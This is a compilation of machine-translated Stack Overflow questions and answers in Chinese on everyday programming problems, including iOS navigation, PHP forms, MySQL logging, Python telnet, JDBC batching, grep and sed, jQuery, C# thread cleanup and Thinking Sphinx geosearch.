> 标签：iphone, ios, objective-c, soap, nsxmlparser

我有一个带有提交按钮的用户登录页面，成功登录后我想转到下一个视图。为此，我正在调用 Web 服务（这将验证来自后端数据库的数据），它将根据成功或失败返回 true 或 false .这工作正常；也就是说，我能够使用 NSXMLParser 获得价值，如下所示：

```
-(void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string {
    if (elementFound) {
        soapResults = [string boolValue];
        //NSLog(@"soapResultss = %@",soapResults);

    }
    if (soapResults)
    {
        x = 1; // x is 1 if username and password are correct.
    }
    else
    {
        x = 0;//x is 0 if username and password are incorrect
    }
} 
```

同时（成功时）我试图在我的“提交按钮点击”方法中调用下一个视图：

```
if(x==0)
    {

    }
    else if(x==1)
    {
        [self.navigationController pushViewController:self.viewController animated:YES];
    } 
```

但是，问题是，控件没有回到“提交按钮单击”，即“else if”部分。而且，我认为这不是正确的做法。正确的做法是什么? 请建议。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:41:38.033

你检查你这行代码为什么你用视图控制器对象使用self

```
 [self.navigationController pushViewController:self.viewController animated:YES]; 
```

使用这行代码（你的 ViewController 的对象）

```
 [self.navigationController pushViewController:viewController animated:YES]; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-13T13:09:56.410

好的，在这种情况下，似乎只使用 TRUE/FALSE 不起作用..

尝试`enum`dataType 会有效

在 .h 文件中

```
enum {
    kReceivingSoapData,
    kReceivedIncorrectData,
    kReceivedCorrectData

}receivedSoapResult;

@interface ViewController : UIViewController{
.....
} 
```

在使用的方法中

```
-(void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string {
    if (elementFound) {
        soapResults = [string boolValue];
        //NSLog(@"soapResultss = %@",soapResults);

    }
    if (soapResults)
    {
    receivedSoapResult = kReceivedCorrectData;
    }
    else
    {
      receivedSoapResult = kReceivedIncorrectData;;
    }
} 
```

在动作方法中

```
if(receivedSoapResult == kReceivedIncorrectData)
    {
// incorrect uName and password received
    }
    else if(receivedSoapResult == kReceivedCorrectData)
    {
      //correct password received
        [self.navigationController pushViewController:self.viewController animated:YES];
    }
else{
// still receiving data

} 
```

# php - 以输入形式从 mysql 获取单选按钮数据

> ID：14853752
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:37:37.203
> 
> 标签：php

我已经搜索过了，但我不明白为什么这不起作用。

```
 <input type="radio" name="soort" value="in"  echo ('.$_GET['soort'].'=="in")?"checked":"">In-Company<br />
    <input type="radio" name="soort" value="open" echo ('.$_GET['soort'] . '"=="open")?"checked":">Open inschrijving<br /> 
```

这也不起作用：

```
 <input type="radio" name="soort" value="in"  echo ($soort=="in")?"checked":"">In-Company<br />
    <input type="radio" name="soort" value="open" echo ($soort=="open")?"checked":">Open inschrijving<br /> 
```

显然我做错了什么或者我错过了一些东西。

如果有人可以在这里帮助我或将我引向正确的方向。谢谢！！！！

这是整个表格。

```
 print '<form action="edit_dienst.php" method="post">
    <p><strong>Titel</strong> <textarea name="navigatie" columns="20" rows="5">' . $row['navigatie'] . '</textarea></p>         
    <p><strong>Tekst</strong> <textarea name="tekst" columns="20" rows="5">' . $row['tekst'] . '</textarea></p>
    <input type="radio" name="soort" value="in"  echo ($soort=="in")?"checked":"">In-Company<br />
    <input type="radio" name="soort" value="open" echo ($soort=="open")?"checked":">Open inschrijving<br />
                <input type="hidden" name="id" value="' . $_GET['id'] . '" />
    <input type="submit" name="submit" value="Pas aan!" />
    </form><p></p>'; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:54:51.673

因为我看到'打印'，我推断你已经在 php 标签中。你可以下面的脚本。

```
$soortInChecked = ($soort=="in")?"checked":"";
$soortOpenChecked = ($soort=="open")?"checked":"";

print '<form action="edit_dienst.php" method="post">
    <p><strong>Titel</strong> <textarea name="navigatie" columns="20" rows="5">' . $row['navigatie'] . '</textarea></p>
    <p><strong>Tekst</strong> <textarea name="tekst" columns="20" rows="5">' . $row['tekst'] . '</textarea></p>
    <input type="radio" name="soort" value="in" '.$soortInChecked.' >In-Company<br />
    <input type="radio" name="soort" value="open" '.$soortOpenChecked.' >Open inschrijving<br />
                <input type="hidden" name="id" value="' . $_GET['id'] . '" />
    <input type="submit" name="submit" value="Pas aan!" />
    </form><p></p>'; 
```

问题是您在引号内给出了回声。检查 print/echo 的教程以及 php 中单引号和双引号的区别。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:40:47.080

```
<?php $soort=$_GET['soort']; ?>
<input type="radio" name="soort" value="in"  <?php echo ($soort=="in")?"checked":"" ?>>In-Company<br />
<input type="radio" name="soort" value="open" <?php echo ($soort=="open")?"checked":"" ?>>Open inschrijving<br /> 
```

# wamp - 跟踪 WAMP 中的所有 Mysql 查询

> ID：14853756
> 
> 赞同：3
> 
> 时间：2013-02-13T12:37:44.453
> 
> 标签：wamp, mysql

我想跟踪执行我的查询需要多少时间我提到了 [这篇文章](https://stackoverflow.com/questions/5813360/viewing-earlier-query-log-mysql?answertab=active#tab-top)，但我只得到没有时间的查询。有可能在使用我的 Web 应用程序后，使用 select、update、insert 查询（不是来自控制台，而是真正的 Web 应用程序执行），我可以获得由[SHOW PROFILES 生成的类似输出的摘要；](https://stackoverflow.com/questions/12925140/how-to-estimate-sql-query-timing?answertab=active#tab-top)命令。我正在使用 wamp mysql V5.5.24 非常感谢

编辑：我使用触发器跟踪此[方法](http://www.jicdesign.com/blog/web-development/how-to-use-mysql-triggers-to-log-table-changes.html)之后的更新和插入语句 我仍然有如何跟踪选择查询的问题。有什么想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-07-27T03:43:35.770

这不再有效。

截至 2013 年 7 月，您需要：

```
general-log=1
general-log-file = "C:\wamp\logs\mysql_general.log" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T16:44:34.950

您确定您的[慢查询日志](http://dev.mysql.com/doc/refman/5.1/en/slow-query-log.html)中没有执行时间吗？

如果您只是想优化您的查询（而不是检查每个查询的执行时间），您可以查看 phpmyadmin 中的 mysql 服务器状态（假设您将其保存在 wamp 服务器中），如此[处](https://tutsplus.com/tutorial/profiling-mysql-queries-with-phpmyadmin/)所述。完整的教程是付费的，但是预览会带你进入服务器状态页面，phpmyadmin 会为你指出问题区域。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-14T08:13:46.763

最后我通过像这样设置 WAMP 服务器使用了一般日志

```
[mysqld]
 port=3306
 long_query_time = 1
 slow_query_log = 1
 slow_query_log_file = "E:/wamp/logs/slowquery.log"
 log = "E:/wamp/logs/genquery.log" 
```

之后我使用了这个工具（试用版）[dbForge Studio](http://www.devart.com/dbforge/mysql/studio/)，我可以在其中使用查询分析器并获得完整的执行时间。

# python - 在 Python 脚本中 Telnet 到路由器

> ID：14853757
> 
> 赞同：0
> 
> 时间：2013-02-13T12:37:49.607
> 
> 标签：python, telnet

```
import getpass
import sys
import telnetlib

tn = telnetlib.Telnet("xxxxxxxx")
tn.write("xxxxxx" + "\n")
tn.write("xxxxxx" + "\n")

tn.write("show version\n")
tn.write("exit\n")

print tn.read_all() 
```

尝试 telnet 到路由器并且脚本挂起.... 不知道怎么回事。已尝试调试，但无法确定输出。

```
telnetlib.py(511):         if self.irawq >= len(self.rawq):
telnetlib.py(512):             self.rawq = ''
telnetlib.py(513):             self.irawq = 0
telnetlib.py(516):         buf = self.sock.recv(50) 
```

这是它挂在调试中的地方。

谢谢威廉

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T14:49:28.857

这个我可以回答。设法得到它修复。

当路由器要求用户输入以查看有关该命令的更多信息时，python 脚本正在脱轨。

因此，当我要求“显示版本”时，它会在命令行上提供大量信息，然后要求您点击空格以查看更多信息。

为了解决这个问题，我执行的第一个命令是“term len 0”。停止它询问任何用户输入，并立即将其全部启动。

下面是最终脚本。改变了很多，但它的作品。

```
import sys
import telnetlib

tn = telnetlib.Telnet("xxxxxxxx")

TELNET_PROMPT="xxxxxxxxxx"
TIMEOUT=1
tn.write("xxxxxxx"+"\n")
tn.write("xxxxxxx"+"\n")
print tn.read_until(TELNET_PROMPT, TIMEOUT)
tn.write("term len 0" + "\n")
print tn.read_until(TELNET_PROMPT, TIMEOUT)
tn.write("show version" + "\n")
print tn.read_until(TELNET_PROMPT, TIMEOUT)
tn.write("exit"+"\n")
tn.close() 
```

# java - 将向量元素插入数据库 FAST

> ID：14853759
> 
> 赞同：2
> 
> 时间：2013-02-13T12:38:00.147
> 
> 标签：java, sqlitejdbc

我有以下数据库：

```
CREATE TABLE person_bornYear (name, year INT, prob FLOAT); 
```

我有一个带有对象（PersonYear）的向量，其中包含人员元素：字符串名称，int year，double prob。

我尝试将向量元素逐行插入数据库：

```
private Statement _stat;
private Connection _conn;
private PreparedStatement _prep;
for (PersonYear py : vecToInsert) {
    this.set_prep(this.get_conn().prepareStatement("INSERT into person_bornYear values (?, ?, ?);"));
    this.get_prep().setString(1, py.get_person());
    this.get_prep().setString(2, Integer.toString(py.get_year()));
    this.get_prep().setString(3, Double.toString(py.get_accuracy()));
    this.get_prep().executeUpdate();
} 
```

并且需要 2-3 分钟（向量包含 100K 个元素）。

有人可以提示我一种更快地将矢量元素插入数据库的方法吗？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-03T16:40:36.413

您可以按照此处的示例执行简单的批处理查询： [http ://www.mkyong.com/jdbc/jdbc-preparedstatement-example-batch-update/](http://www.mkyong.com/jdbc/jdbc-preparedstatement-example-batch-update/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:45:06.327

两件快速的事情可以显着加快您的代码速度：

1.  不要为*每次*迭代重新创建准备好的语句。这是一个相当昂贵的操作，并且您返回的对象是可重复使用的。
2.  您*可以*批量调用准备好的语句，以减少对数据库的调用次数。

此代码未经测试，根据需要修改：

```
this.set_prep(this.get_conn().prepareStatement("INSERT into person_bornYear values (?, ?, ?);"));
for (PersonYear py : vecToInsert) {
    this.get_prep().setString(1, py.get_person());
    this.get_prep().setString(2, Integer.toString(py.get_year()));
    this.get_prep().setString(3, Double.toString(py.get_accuracy()));
    this.get_prep().addBatch();
}

this.get_prep.executeBatch(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:46:40.723

首先，您在每次迭代中都实例化相同的准备好的语句。相反，如果您在循环之前实例化它然后重用它，您可能会获得一些速度。

其次，由于您同时执行大量操作，因此您可以使用批量插入：[Efficient way to do batch INSERTS with JDBC](https://stackoverflow.com/questions/3784197/efficient-way-to-do-batch-inserts-with-jdbc)

像这样的东西：

```
PreparedStatement stmt = this.get_conn().prepareStatement("...");
for (...) { 
  ... 
  stmt.addBatch();
  stmt.clearParameters();
}
stmt.executeBatch(); 
```

第三：为什么如此快速地插入它们如此重要？如果软件不依赖于数据，你可以考虑用线程来做。这将允许主要应用程序在数据库咀嚼您的矢量数据时继续。

根据您的数据库后端，您还可以拆分向量并将数据同时插入不同的线程中。如果您的后端有适当的[MVCC](http://en.wikipedia.org/wiki/Multiversion_concurrency_control)，它将为您节省大量时间。

# cuda - 无法在 CUDA 中分配巨大的内存块（PAGING_BUFFER_SEGMENT_SIZE？）

> ID：14853761
> 
> 赞同：2
> 
> 时间：2013-02-13T12:38:04.600
> 
> 标签：cuda, malloc

我知道有这个 WDDM 问题只允许分配块到一定大小：

> > 由 WDDM 设备上的 cudaMalloc() 或 cuMemAlloc() 创建的单个内存分配的最大大小限制为 MIN( (系统内存大小以 MB - 512 MB) / 2, PAGING_BUFFER_SEGMENT_SIZE )。对于 Vista，PAGING_BUFFER_SEGMENT_SIZE 大约为 2 GB。

但我不知道这是否真的是我的问题。我编写了一个程序，可以找到可以使用 cudaMalloc 分配的最大内存块。我在几台机器上运行它，所有的 Windows 7，都至少有 8GB 的​​系统内存。所以我应该总是能够分配 PAGING_BUFFER_SEGMENT_SIZE。

好的，特斯拉没有问题。在 Quadro FX5800 上，我可以分配 ~1.8GB + ~1.8GB + ~0.3GB - 很好。但在大多数 GTX 上，我最多只能分配 ~800MB 的块。另一方面，在 GTX680 上，我可以一次分配所有 4GB？！？我看不到这种行为背后的任何系统。

如何确定 PAGING_BUFFER_SEGMENT_SIZE 在某个系统上的值是多少？

# linux - 如何查找特定格式的数字并过滤掉特定范围的值？

> ID：14853765
> 
> 赞同：0
> 
> 时间：2013-02-13T12:38:13.647
> 
> 标签：linux, unix, grep

如何以`0.xzy`xzy 是数字和 x 是数字的格式查找数字，并`8-9`在每次匹配（包括）之前将 5 行写入`outputfile.txt`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T11:05:48.917

要查找格式中的数字`0.xzy` *（使用字边界不强制整行匹配）*并打印匹配前的第 5 行`-B5`并将输出重定向到`outfile`：

```
$ grep -B5 -Ew '0\.[0-9]{3}' file > outfile

# fix x to 8 or 9
$ grep -B5 -Ew '0\.[8-9][0-9]{2}' file > outfile 
```

注意：`.`需要转义以表示文字句点，否则`01234`将匹配。你会发现`man grep`非常有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:49:57.477

以格式查找数字`0.xzy`（`xzy`是数字）

```
grep "^0.[0-9][0-9][0-9]$" file 
```

查找 x 为 8-9 的情况

```
grep "^0.[89][0-9][0-9]$" file 
```

# sed - 使用sed扫描c++文件

> ID：14853767
> 
> 赞同：1
> 
> 时间：2013-02-13T12:38:19.880
> 
> 标签：sed

我需要在几个以 .cpp 结尾的文件中找到“[0]”和“[1]”的所有实例。这些文件位于不同的子目录中。

是否可以使用 sed 扫描子目录中的所有 .cpp 文件并查找模式？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:53:56.570

别管它`sed`，它是用于流式**传输****，**而不是搜索。使用`grep`.

```
find . -iname '*.cpp' | while read filename; do grep --with-filename '\[[01]\]' "$filename"; done 
```

或者在脚本中：

```
find . -iname '*.cpp' | while read filename 
do 
    grep --with-filename '\[[01]\]' "$filename"
done 
```

我在`read`这里使用（和引号`$filename`），以便带有空格的文件名生存；在 Windows 系统中，这是一个特别的噩梦。

如果你知道你的文件都不是特别大，你可以牺牲搜索效率来换取输入效率并搜索所有文件，但只从 cpp 文件中挑选输出：

```
grep -r '\[[01]\]' . | grep '.cpp:' 
```

# jquery - 如何从另一个 HTML 控件打开 HTML 选择框的选项列表？

> ID：14853770
> 
> 赞同：0
> 
> 时间：2013-02-13T12:38:27.700
> 
> 标签：jquery, select, eventtrigger

如何从另一个 HTML 控件打开 HTML 选择框的选项列表？

例如，我有以下代码。

HTML

```
<select>
    <option>Select</option>
    <option>Male</option>
    <option>Female</option>
</select>

<span>Click Here</span> to select an open from the option box. 
```

脚本

```
$('span')
    .bind('click', function(){
        $('select').trigger('click');
    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:33:06.360

这是**不可能的**。最好的方法是创建自己的假选择框。

例如，选择了一个框架来实现这种假的 selcet 框[。](http://harvesthq.github.com/chosen/)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-02-13T12:44:01.723

```
<select>
    <option>Select</option>
    <option value='0'>Male</option>
    <option value='1'>Female</option>
</select>

<span>Click Here</span> to select an open from the option box.

$('span')
    .bind('click', function(){
        $('select').trigger('change');
    });

$('select').change(function(){
    $(this).val(0); // select male 
}); 
```

您必须使用更改而不是单击事件。

您可能希望在触发事件时传递一个参数来选择正确的选项。

# c# - 如何删除应用程序中启动的所有线程？

> ID：14853774
> 
> 赞同：3
> 
> 时间：2013-02-13T12:38:37.900
> 
> 标签：c#, .net, wpf, multithreading, dll

我有一个 WPF 应用程序，它使用许多在自己的线程中工作的第三方 DLL。

其中一些 DLL 有方法`STOP()`。

我`Thread.Sleep(1000)`在每种`SomeObject.Stop()`方法之后都使用...

无论如何，当我终止应用程序时，一些线程仍在内存中。

任何线索如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T20:14:45.200

因此，基本上，您面临的问题是 3rd 方库在应该清理的时候没有很好地清理，最重要的是，它启动了一堆前台线程，即使您希望它终止，它也能保持您的应用程序运行。

## 例子

例如，像这样的应用程序

```
private static void Main(string[] args)
{

    var t = new Thread(() =>
        {
            while (true)
            {
            }
        }) {Name = "test"};

    t.Start();

    Console.WriteLine("Exited");
} 
```

将永远坐在那里，因为`t`它是一个前台线程。

让我们仔细检查一下流程资源管理器。这是我们的演示应用程序的更新版本，我们可以调用它并获取本机线程 ID。

```
internal class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll")]
    static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

    [DllImport("kernel32.dll")]
    static extern int GetCurrentThreadId();

    private static void Main(string[] args)
    {

        var t = new Thread(() =>
            {
                Console.WriteLine(GetCurrentThreadId());
                while (true)
                {
                }
            }) {Name = "test"};

        t.Start();

        Console.WriteLine("Thread Id " + t.ManagedThreadId);
        Console.WriteLine("Exited");

    }
} 
```

给我本机线程ID。在进程资源管理器中，我现在可以看到：

![纺线](../Images/f5405d7e54d7d17ac7e4a026bd4c584c.png)

很明显，由于我的 while 循环，线程 8228 正在疯狂旋转，即使 main 已经退出

一般来说，用户 Rob Hardy 是对的。如果您控制线程，则应该始终跟踪事物并自己管理它们，但是我认为您在这里处于困境中，因为您无权访问线程句柄。

## 选项1（但请不要）

您可以尝试[杀死所有东西](http://forums.asp.net/t/1092427.aspx)（但无论如何，当我尝试它时，这对我来说并没有真正起作用），但我真的不会这样做，因为这样做似乎非常危险。只是为了复制另一篇文章中的信息，该示例是这样说的：

```
internal class Program
{
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

    private static void Main(string[] args)
    {

        var t = new Thread(() =>
            {
                while (true)
                {
                }
            }) {Name = "test"};

        t.Start();

        Console.WriteLine("Exited");

        Thread.Sleep(TimeSpan.FromSeconds(2));

        foreach (ProcessThread pt in Process.GetCurrentProcess().Threads)
        {
            IntPtr ptrThread = OpenThread(1, false, (uint)pt.Id);
            if (AppDomain.GetCurrentThreadId() != pt.Id)
            {
                try
                {
                    TerminateThread(ptrThread, 1);
                    Console.Out.Write(". Thread killed.\n");
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.ToString());
                }
            }
            else
                Console.Out.Write(". Not killing... It's the current thread!\n");
        }
    }
} 
```

但同样，**这并没有阻止我的过程**。也许.net 正在等待线程的正确退出，而不仅仅是强制的本机退出？我不知道。我只是表明你可以在技术上（根据链接）可以杀死线程`ProcessThread`，如果你真的想要（但请不要）

## 选项 2

一个更合理的选择是`Exit`在所有清理之后添加一个带有代码的显式调用（退出代码 0 通常表示干净退出）

```
private static void Main(string[] args)
{

    var t = new Thread(() =>
        {
            while (true)
            {
            }
        }) {Name = "test"};

    t.Start();

    Console.WriteLine("Exited");

    Environment.Exit(0);
} 
```

这对我有用。

## 选项 3

如果可以的话，第三个选项是修复库并让它创建后台线程或让它正确清理。这将是最好的选择，因为您不会因为不清理 3rd 方项目而留下任何潜在的可破坏的副作用。不过，我假设您没有这样做，因为该库是闭源的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:48:49.823

通过将线程添加到集合或使用`ThreadPool`

在每个线程中确保你处理`ThreadAbortException`

在你的结尾处的终止点`Main()`，浏览你的线程集合并调用`Abort()`每个线程。

# ruby-on-rails - 思考狮身人面像地理搜索问题

> ID：14853776
> 
> 赞同：0
> 
> 时间：2013-02-13T12:38:47.217
> 
> 标签：ruby-on-rails, sphinx, thinking-sphinx

我需要按与传递坐标的距离排序来搜索位置。

应用程序/索引/location_index.rb

```
ThinkingSphinx::Index.define :location, :with => :active_record do
  indexes :name
  has latitude, longitude
end 
```

尝试搜索：

```
> Location.search(:geo => [53.348962, 83.777988], :order => "@geodist DESC").size
ThinkingSphinx::SyntaxError: sphinxql: syntax error, unexpected USERVAR, expecting IDENT (or 5 other tokens) near '@geodist DESC LIMIT 0, 20; SHOW META'

> Location.search(:geo => [53.348962, 83.777988],:with => {"@geodist" => 0.0..5000.0}, :order => "@geodist DESC").size
ThinkingSphinx::SphinxError: sphinxql: only >=, <=, and BETWEEN floating-point filter types are supported in this version near '@geodist BETWEEN 0.0 AND 5000.0 AND sphinx_deleted = 0 ORDER BY @geodist DESC LIMIT 0, 20; SHOW META' 
```

*   Sphinx 2.0.6 版本（r3473；2012 年 10 月 22 日）
*   思考狮身人面像 (3.0.1)

**更新：**

*Pat Allan 建议：* Geodist 不再需要 @ 符号 - 所以请尝试以下操作：

```
Location.search(:geo => [53.348962, 83.777988], :order => "geodist DESC").size
Location.search(:geo => [53.348962, 83.777988],:with => {:geodist => 0.0..5000.0}, :order => "geodist DESC").size 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-28T07:52:33.193

以防万一人们发现这个问题认为我会以正确的格式添加答案并进行更多解释。

2.1.1 之前的 Sphinx 版本通过 @geodist 内部变量提供了计算距离。在与新版本的 Sphinx 兼容的 Thinking Sphinx 版本中，GEODIST() 的值已被别名为 geodist。

所以这：

```
Location.search(:geo => [53.348962, 83.777988], :order => "@geodist DESC").size 
```

变成：

```
Location.search(:geo => [53.348962, 83.777988], :order => "geodist DESC").size 
```

在此示例中还值得指出的是，上述示例中提供的坐标格式不正确。它们是度数而不是弧度： http: [//pat.github.io/thinking-sphinx/geosearching.html](http://pat.github.io/thinking-sphinx/geosearching.html)。要转换它们，您可以执行以下操作：

```
def degrees_to_radians(degrees)
  degrees * Math::PI / 180
end 
```

希望有帮助！

# javascript - 动态添加输入元素以形成

> ID：14853779
> 
> 赞同：106
> 
> 时间：2013-02-13T12:38:50.850
> 
> 标签：javascript, html, forms

我已经阅读了许多关于动态添加字段集的博客和帖子，但它们都给出了非常复杂的答案。我需要的并不复杂。

我的 HTML 代码：

```
<input type="text" name="member" value="">Number of members: (max. 10)<br />
<a href="#" id="filldetails">Fill Details</a> 
```

因此，用户将在该字段中输入一个整数值（我正在使用 javascript 检查验证）`input`。点击`Fill Details`链接后，会出现相应数量的输入框供他输入。我想使用 javascript 来实现这一点。

我不是javascript专业人士。我在想如何`input`通过链接检索用户在字段中填写的整数并显示相应数量的输入字段。

* * *

## 回答 #1

> 赞同：170
> 
> 时间：2013-02-13T12:45:00.183

您可以使用`onclick`事件处理程序来获取文本字段的输入值。确保为该字段提供一个唯一`id`属性，以便您可以通过以下方式安全地引用它`document.getElementById()`：

如果你想动态添加元素，你应该有一个容器来放置它们。例如，一个`<div id="container">`. 通过 创建新元素`document.createElement()`，并使用`appendChild()`将它们中的每一个附加到容器中。您可能对输出一个有意义的`name`属性感兴趣（例如`name="member"+i`，对于每个动态生成`<input>`的 s，如果它们要在表单中提交。

请注意，您还可以`<br/>`使用`document.createElement('br')`. 如果您只想输出一些文本，则可以`document.createTextNode()`改用。

此外，如果您想在每次填充容器时清除容器，您可以一起使用`hasChildNodes()`和`removeChild()`。

```
<html>
<head>
    <script type='text/javascript'>
        function addFields(){
            // Number of inputs to create
            var number = document.getElementById("member").value;
            // Container <div> where dynamic content will be placed
            var container = document.getElementById("container");
            // Clear previous contents of the container
            while (container.hasChildNodes()) {
                container.removeChild(container.lastChild);
            }
            for (i=0;i<number;i++){
                // Append a node with a random text
                container.appendChild(document.createTextNode("Member " + (i+1)));
                // Create an <input> element, set its type and name attributes
                var input = document.createElement("input");
                input.type = "text";
                input.name = "member" + i;
                container.appendChild(input);
                // Append a line break 
                container.appendChild(document.createElement("br"));
            }
        }
    </script>
</head>
<body>
    <input type="text" id="member" name="member" value="">Number of members: (max. 10)<br />
    <a href="#" id="filldetails" onclick="addFields()">Fill Details</a>
    <div id="container"/>
</body>
</html>
```

[请参阅此JSFiddle](http://jsfiddle.net/t656N/1/)中的工作示例。

* * *

## 回答 #2

> 赞同：45
> 
> 时间：2017-02-17T08:53:59.427

试试这个 JQuery 代码来动态包含表单、字段和删除/删除行为：

```
$(document).ready(function() {
    var max_fields = 10;
    var wrapper = $(".container1");
    var add_button = $(".add_form_field");

    var x = 1;
    $(add_button).click(function(e) {
        e.preventDefault();
        if (x < max_fields) {
            x++;
            $(wrapper).append('<div><input type="text" name="mytext[]"/><a href="#" class="delete">Delete</a></div>'); //add input box
        } else {
            alert('You Reached the limits')
        }
    });

    $(wrapper).on("click", ".delete", function(e) {
        e.preventDefault();
        $(this).parent('div').remove();
        x--;
    })
});
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div class="container1">
    <button class="add_form_field">Add New Field &nbsp; 
      <span style="font-size:16px; font-weight:bold;">+ </span>
    </button>
    <div><input type="text" name="mytext[]"></div>
</div>
```

# javascript - 在 iOS 6.x (iPad) 上使用 JS 选择/取消选择下拉选项

> ID：14853781
> 
> 赞同：4
> 
> 时间：2013-02-13T12:39:08.443
> 
> 标签：javascript, jquery, html, ios, ipad

我正在使用`<select>`带有属性的 html 标签创建动态下拉菜单`multiple`，默认情况下选择第一个选项：

```
<select multiple="multiple" size="1">  
    <option value="" selected="selected">All</option>  
    <option value="1">One</option>  
    <option value="2">Two</option>  
</select> 
```

例如，用户点击选项`One`，然后假定的行为是取消选择该`All`选项并选择该`One`选项。

当 iPad 浏览器打开本机 UI 进行下拉时，我能够从下拉控件中捕获触摸事件（来自我的插件的代码片段）：

```
this.$el.on('change', this.selectOption, this); 
```

并按以下方式操作选项以取消选择它们：

```
selectOption: function(e){
    var opts = element.find('option');  
    opts.each(function(idx, opt){  
        $(opt).prop('selected', false);  
    });  
} 
```

## 问题

选项属性设置为`false`正确但在 iPad 的下拉 UI 中视觉上选择的选项保持不变 - 这可能会使用户感到困惑。在点击下拉列表中的**完成**
按钮 后应用 UI 中的更改。下一次打开显示所有取消选择的选项，这没关系，但有点晚了;-)。

 **## 问题

这是否可以以用户点击一个选项而另一个在本机 iPad 下拉菜单中实时删除的方式来选择/取消选择选项？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-02T16:54:36.277

当我们在 IOS 中触发 a`<select>`时，它将使用它自己的内部浏览器控件，超出我们的样式设置能力。

它尊重该`multiple="true"`属性并相应地采取行动。

这个问题相当于问：*“当我点击我的网页按钮时，我怎样才能让我的浏览器工具栏变成蓝色”*

从问题中不清楚为什么

1.  你设置`mutliple="true"`
2.  然后设置`size=1`
3.  然后尝试使其表现得像一个`select`带有 javascript 的单，只允许一个选择。

* * *

我怀疑您实际需要的只是删除`multiple = "true"`属性并可能增加大小（如果您希望所有选项都可见）

```
<select size="3">  
    <option value="" selected="selected">All</option>  
    <option value="1">One</option>  
    <option value="2">Two</option>  
</select> 
```

然后，原生 iOS 控件可以随心所欲地运行。

对于所有其他解决方案，请考虑放弃选择（或隐藏它）并创建一个由 's 或类似物制成的自定义 javascript 控件`<ul><li>`，以填充幕后的值。**

# jsf-2 - 在primefaces的orderlist上获取空指针异常

> ID：14853782
> 
> 赞同：1
> 
> 时间：2013-02-13T12:39:09.133
> 
> 标签：jsf-2, primefaces

```
 Error Rendering View[test.xhtml]
                                 java.lang.NullPointerException
    at org.primefaces.component.orderlist.OrderListRenderer.encodeOptions(OrderListRenderer.java:149)
    at org.primefaces.component.orderlist.OrderListRenderer.encodeList(OrderListRenderer.java:108)
    at org.primefaces.component.orderlist.OrderListRenderer.encodeMarkup(OrderListRenderer.java:79)
    at org.primefaces.component.orderlist.OrderListRenderer.encodeEnd(OrderListRenderer.java:49)
    at javax.faces.component.UIComponentBase.encodeEnd(UIComponentBase.java:519)
    at org.apache.myfaces.shared_impl.renderkit.RendererUtils.renderChild(RendererUtils.java:543)
    at org.apache.myfaces.shared_impl.renderkit.html.HtmlGridRendererBase.renderChildren(HtmlGridRendererBase.java:315)
    at org.apache.myfaces.shared_impl.renderkit.html.HtmlGridRendererBase.encodeEnd(HtmlGridRendererBase.java:150)
    at javax.faces.component.UIComponentBase.encodeEnd(UIComponentBase.java:519)
    at org.primefaces.renderkit.CoreRenderer.renderChild(CoreRenderer.java:60)
    at org.primefaces.renderkit.CoreRenderer.renderChildren(CoreRenderer.java:44)
    at org.primefaces.component.dialog.DialogRenderer.encodeContent(DialogRenderer.java:174)
    at org.primefaces.component.dialog.DialogRenderer.encodeMarkup(DialogRenderer.java:103)
    at org.primefaces.component.dialog.DialogRenderer.encodeEnd(DialogRenderer.java:41)
    at javax.faces.component.UIComponentBase.encodeEnd(UIComponentBase.java:519)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:626)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:622)
    at org.primefaces.component.accordionpanel.AccordionPanelRenderer.encodeEnd(AccordionPanelRenderer.java:60) 
```

@FacesConverter("contactConverter") 公共类 ContactConverter 实现 Converter{

```
@Override
public Object getAsObject(FacesContext arg0, UIComponent arg1, String arg2)
        throws ConverterException {
    // TODO Auto-generated method stub
    TestBean tb= new TestBean();
    tb.setName(arg2);
    return tb;
}

@Override
public String getAsString(FacesContext arg0, UIComponent arg1, Object arg2)
        throws ConverterException {
    // TODO Auto-generated method stub
    return arg2.toString();
} 
```

我正在使用 primefaces 订单列表示例。但我正面临这个空指针异常。谷歌搜索后，我发现这个问题与转换器有关，但我不确定。任何人都可以帮助我使用转换器的简单 primeface 订单列表。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:54:29.830

```
java.lang.NullPointerException
